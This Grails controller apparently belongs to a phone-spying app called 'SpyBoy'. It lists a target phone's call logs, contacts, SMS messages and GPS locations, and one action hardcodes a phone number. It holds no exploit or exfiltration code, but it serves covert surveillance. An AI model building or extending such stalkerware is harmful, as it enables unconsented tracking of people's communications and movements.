

package com.xaviar

import com.xaviar.domain.CallLog
import com.xaviar.domain.Contact
import com.xaviar.domain.Location
import com.xaviar.domain.Sms

class SpyBoyController {

	def redisService
	def contactService
	def locationService
	def smsService
	def userService
	def callLogService
	def phoneEventService
	def smsEventService
	def phoneParamsService

	def index() {
	}

	def callLog(){
		//Set<String> subscribers = userService.getUserInfo("token123");
		//UMetaData  uMetaData = new UMetaData();
		//uMetaData.setSimSubscriberId(subscriberId);
		//uMetaData.setToken("token123");
		//def callLogs = CallLog.findByTargetPhone(subscriberId);//callLogService.readAll(uMetaData);
		params.max = Math.min(params.max ? params.int('max') : 10, 100)
		params.phoneNumber = "0543112117";
		
		[callLogInstanceList:CallLog.list(params), callLogsInstanceTotal: CallLog.count()]

		//		if(!callLogs.isEmpty()){
		//			params.max = Math.min(max ?: 10, 100)
		//			int startOffset = params.get("offset")!=null ? Integer.parseInt(params.get("offset")) : 0 ;
		//			int toElement=10;
		//			if(max!=null){
		//				toElement = (startOffset + max) > callLogs.size() ? callLogs.size() : startOffset + max;
		//			}
		//			[callLogInstanceList: callLogs.subList(startOffset,toElement), callLogsInstanceTotal: callLogs.size()]
		//		}else{
		//			[callLogInstanceList: null, callLogInstanceTotal: 0]
		//		}
	}


	def about(){
	}

	def contacts(){
		params.max = Math.min(params.max ? params.int('max') : 50, 100)
		[contactInstanceList: Contact.list(), contactInstanceTotal: Contact.count()]
		//Set<String> subscribers = userService.getUserInfo("token123");
		//		UMetaData  uMetaData = new UMetaData(subscriberId,"token123");
		//
		//		def contactList = contactService.readAll(uMetaData);
		//
		//		if(!contactList.isEmpty()){
		//			params.max = Math.min(max ?: 10, 100)
		//			int startOffset = params.get("offset")!=null ? Integer.parseInt(params.get("offset")) : 0 ;
		//			int toElement=10;
		//			if(max!=null){
		//				toElement = (startOffset + max) > contactList.size() ? contactList.size() : startOffset + max;
		//			}
		//			[contactInstanceList: contactList.subList(startOffset,toElement), contactInstanceTotal: contactList.size()]
		//		}else{
		//			[contactInstanceList: null, contactInstanceTotal: 0]
		//		}
	}


	def sms(){
		params.max = Math.min(params.max ? params.int('max') : 50, 100)
		[smsInstanceList: Sms.list(), smsInstanceTotal: Sms.count()]
		//Set<String> subscribers = userService.getUserInfo("token123");
		//		UMetaData  uMetaData = new UMetaData(subscriberId,"token123");
		//
		//		def smses = smsService.readAll(uMetaData);
		//
		//		if(!smses.isEmpty()){
		//			params.max = Math.min(max ?: 10, 100)
		//			int startOffset = params.get("offset")!=null ? Integer.parseInt(params.get("offset")) : 0 ;
		//			int toElement=10;
		//			if(max!=null){
		//				toElement = (startOffset + max) > smses.size() ? smses.size() : startOffset + max;
		//			}
		//			[smsInstanceList: smses.subList(startOffset,toElement), smsInstanceTotal: smses.size()]
		//		}else{
		//			[smsInstanceList: null, smsInstanceTotal: 0]
		//		}
	}


	def icons(){
	}

	def location(){
		//params.max = Math.min(params.max ? params.int('max') : 50, 100)

		List locations = Location.list();
		String locationStr = "";
		String startLocationStr="";
		int i=1;

		for (location in locations) {
			locationStr=locationStr+"{latitude: "+location.latitude+",longitude: " + location.longitude + " ,html: 'place no. " + (i++) + "'},";
		}

		startLocationStr="latitude: "+locations.get(0).latitude+",longitude: " + locations.get(0).longitude + ",zoom: 10";
		
		[locationInstanceList: Location.list(), locationInstanceTotal: Location.count(),locationStr:locationStr,startLocationStr:startLocationStr]
	}
}
